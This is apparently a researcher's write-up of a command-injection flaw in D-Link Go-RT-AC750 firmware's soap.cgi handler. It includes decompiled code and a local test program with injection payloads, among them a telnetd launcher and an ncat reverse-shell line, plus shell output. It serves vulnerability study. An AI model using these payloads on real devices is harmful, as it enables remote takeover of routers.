
Ref
- https://www.secpulse.com/archives/201560.html
- https://github.com/yzskyt/Vuln/blob/main/Go-RT-AC750/Go-RT-AC750.md

Product
- Go-RT-AC750 revA_v101b03

Download from
- https://eu.dlink.com/uk/en/products/go-rt-ac750-wireless-ac750-dual-band-easy-router
- https://eu.dlink.com/uk/en/products/go-rt-ac750-wireless-ac750-dual-band-easy-router?revision=deu_reva#downloads


# Emulate
Test on both ubuntu 18.04 and 22.04.2
Try emulate the firmware , but stuck on some problems below. Skip it.

```bash
user@user-virtual-machine:~/FirmAE$ ./init.sh 
+ sudo service postgresql restart
[sudo] password for user: 
+ echo 'Waiting for DB to start...'
Waiting for DB to start...
+ sleep 5
user@user-virtual-machine:~/FirmAE$ sudo ./run.sh -r GORTAC750 ~/frimeware/GORTAC750_A1_FW_v101b03.bin
[*] /home/user/firmware/GORTAC750_A1_FW_v101b03.bin emulation start!!!
[*] extract done!!!
[*] get architecture done!!!
mke2fs 1.46.5 (30-Dec-2021)
e2fsck 1.46.5 (30-Dec-2021)
[*] infer network start!!!
^C
```

```bash
user@vm-ubuntu18:~/FirmAE$ python3 docker-helper.py -ec dlink ~/DIR868L_B1_FW205WWb02.bin 
2023-07-30 22:17:04 vm-ubuntu18 root[67173] INFO [*] docker0_DIR868L_B1_FW205WWb02.bin emulation start!
```

# Reverse cgibin

By reading ref, quick locate the vuln binary

```bash
user@user-virtual-machine:~/firmware/_GORTAC750_A1_FW_v101b03.bin.extracted$ grep -r "REQUEST_URI" ./
grep: ./squashfs-root/sbin/httpd: binary file matches
grep: ./squashfs-root/htdocs/cgibin: binary file matches
user@user-virtual-machine:~/firmware/_GORTAC750_A1_FW_v101b03.bin.extracted$ grep -r "sh %s" ./
grep: ./squashfs-root/usr/sbin/mrd: binary file matches
grep: ./squashfs-root/usr/sbin/dnsmasq: binary file matches
grep: ./squashfs-root/usr/sbin/hostapd: binary file matches
grep: ./squashfs-root/usr/sbin/ddnsd: binary file matches
grep: ./squashfs-root/usr/sbin/wpatalk: binary file matches
grep: ./squashfs-root/htdocs/cgibin: binary file matches
```

Found `./squashfs-root/htdocs/cgibin`

```bash
user@user-virtual-machine:~$ file cgibin 
cgibin: ELF 32-bit MSB executable, MIPS, MIPS-I version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
```


In main func
```c
...
  v27 = strcmp(nn_argv, "soap.cgi");
  v8 = envp;
  if ( !v27 )
  {
    nn_if_main = soapcgi_main;
    v10 = argc;
    return ((int (__fastcall *)(_DWORD, _DWORD, _DWORD))nn_if_main)(v10, argv, v8);
  }
  v28 = strcmp(nn_argv, "gena.cgi");
  ...
```


```c

undefined4 soapcgi_main(void)

{
  char cVar1;
  int iVar2;
  char *nn_content_type;
  char *nn_request_uri;
  char *nn_http_soapaction;
  char *nn_request_method;
  int iVar3;
  size_t sVar4;
  __pid_t nn_pid;
  FILE *__stream;
  undefined4 uVar5;
  undefined4 uVar6;
  
  iVar2 = nn_try_lock();
  if (iVar2 < 0) {
    return 0;
  }
  nn_content_type = getenv("CONTENT_TYPE");
  nn_request_uri = getenv("REQUEST_URI");
  nn_http_soapaction = getenv("HTTP_SOAPACTION");
  nn_request_method = getenv("REQUEST_METHOD");
// check nn_content_type contain text/xml
  if ((nn_content_type == (char *)0x0) ||
     (iVar3 = strncasecmp(nn_content_type,"text/xml",8), iVar3 != 0)) {
    uVar5 = 0x19f;
    nn_content_type = (char *)0x0;
    nn_request_uri = (char *)0x0;
LAB_0040e47c:
    uVar6 = 0xffffffff;
    cgibin_print_http_status(uVar5,nn_content_type,nn_request_uri);
  }
  else {
    if ((((nn_request_uri != (char *)0x0) && (nn_http_soapaction != (char *)0x0)) &&
        (nn_content_type = strchr(nn_request_uri,'?'), nn_content_type != (char *)0x0)) &&
       (iVar3 = strncmp(nn_content_type,"?service=",9), iVar3 == 0)) {
       // there but the nn_request_uri first ? to nn_content_type
       // find ? in nn_content_type (actually was nn_request_uri
       // cmp ?service= in nn_content_type
      sVar4 = strlen(nn_http_soapaction);
      if (nn_http_soapaction[sVar4 - 1] == '\"') {
        nn_http_soapaction[sVar4 - 1] = '\0';
      }
      cVar1 = *nn_http_soapaction;
      nn_request_uri = strchr(nn_http_soapaction + (cVar1 == '\"'),0x23);
      DAT_00435180 = nn_request_uri;
      if (nn_request_uri != (char *)0x0) {
        DAT_00435180 = nn_request_uri + 1;
        *nn_request_uri = '\0';
        iVar3 = strcasecmp(nn_request_method,"POST");
        if (iVar3 == 0) {
        // move nn_content_type pointer back to skip ?service=
          nn_content_type = nn_content_type + 9;
          nn_pid = getpid();
          sprintf(&DAT_00433d40,"%s/pid%d","/runtime/services/upnp",nn_pid);
          cgibin_parse_request(FUN_0040df74,0,0x10000);
          nn_request_method = getenv("SERVER_ID");
          nn_request_uri = DAT_00435180;
          nn_pid = getpid();
          sprintf(&nn_system_cmd,
                  "%s/ACTION.%s.php\nACTION_NODEBASE=%s\nINF_UID=%s\nSERVICE_TYPE=%s\nACTION_NAME=%s\nSHELL_FILE=%s/%s_%d.sh"
                  ,"/htdocs/upnp",nn_content_type,&DAT_00433d40,nn_request_method,
                  nn_http_soapaction + (cVar1 == '\"'),nn_request_uri,"/var/run",nn_content_type,
                  nn_pid);
          iVar3 = xmldbc_ephp_wb(0,0,&nn_system_cmd,&DAT_00433d80,0x1000);
          if (iVar3 == 0) {
            iVar3 = cgibin_fill_http_content_len(&DAT_00433d80,0x1000);
            if (iVar3 == 0) {
              printf("%s",&DAT_00433d80);
            }
            nn_pid = getpid();
            sprintf(&nn_system_cmd,"%s/%s_%d.sh","/var/run",nn_content_type,nn_pid);
            __stream = fopen(&nn_system_cmd,"a+");
            if (__stream != (FILE *)0x0) {
              nn_pid = getpid();
              fprintf(__stream,"rm -f %s/%s_%d.sh","/var/run",nn_content_type,nn_pid);
              fclose(__stream);
              nn_pid = getpid();
              sprintf(&nn_system_cmd,"sh %s/%s_%d.sh > /dev/console &","/var/run",nn_content_type,
                      nn_pid);
              system(&nn_system_cmd);
            }
          }
          uVar6 = 0;
          xmldbc_del(0,0,&DAT_00433d40);
          goto LAB_0040e6c0;
        }
        nn_content_type = "";
        nn_request_uri = "unsupported HTTP request";
        uVar5 = 400;
        goto LAB_0040e47c;
      }
    }
    uVar6 = 0xffffffff;
  }
LAB_0040e6c0:
  FUN_0040e1c0(iVar2);
  return uVar6;
}


```


Test for vulnerable logics

```c
#include <stdio.h>
int main()
{

	char nn_system_cmd[100];
	
	//char nn_content_type[]="&&telnetd -p 4123&";
	
	//char nn_content_type[]="&&whoami&";
	
	char nn_content_type[]="&ncat 127.0.0.1 1234 -e /bin/sh& \r\n asdf";
	
	int nn_pid=1234;
	
	sprintf(nn_system_cmd,"sh %s/%s_%d.sh > /dev/console &","/var/run",nn_content_type,
	
	nn_pid);
	
	printf(nn_system_cmd);
	
	system(nn_system_cmd);
}
```

```bash
user@user-virtual-machine:~$ gcc cve202326822.c -w
user@user-virtual-machine:~$ ./a.out 
sh: 1: cannot create /dev/console: Permission denied
sh /var/run/&&whoami&_1234.sh > /dev/console &user@user-virtual-machine:~$ user
```

```bash
user@user-virtual-machine:~$ gcc cve202326822.c -w
user@user-virtual-machine:~$ ./a.out 
sh: 1: sh /var/run/&ncat 127.0.0.1 1234 -e /bin/sh&_1234.sh > /dev/console &cannot create /dev/console: Permission denied



user@user-virtual-machine:~$ nc -lvnp 1234
Listening on 0.0.0.0 1234
Connection received on 127.0.0.1 56000
whoami
user

```